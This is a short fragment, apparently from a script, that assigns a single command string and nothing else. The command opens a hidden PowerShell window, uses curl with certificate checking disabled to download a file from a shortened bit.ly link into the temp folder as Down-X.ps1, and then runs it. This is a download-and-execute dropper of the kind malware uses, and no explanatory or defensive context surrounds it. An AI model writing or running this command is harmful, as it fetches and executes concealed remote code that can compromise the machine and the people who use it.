...
command = "cmd.exe /c ""powershell.exe -WindowStyle Hidden cmd.exe /c C:\Windows\System32\curl.exe -k -L https://bit.ly/3m9LrJR -o %temp%\Down-X.ps1 & powershell.exe %temp%\Down-X.ps1"""
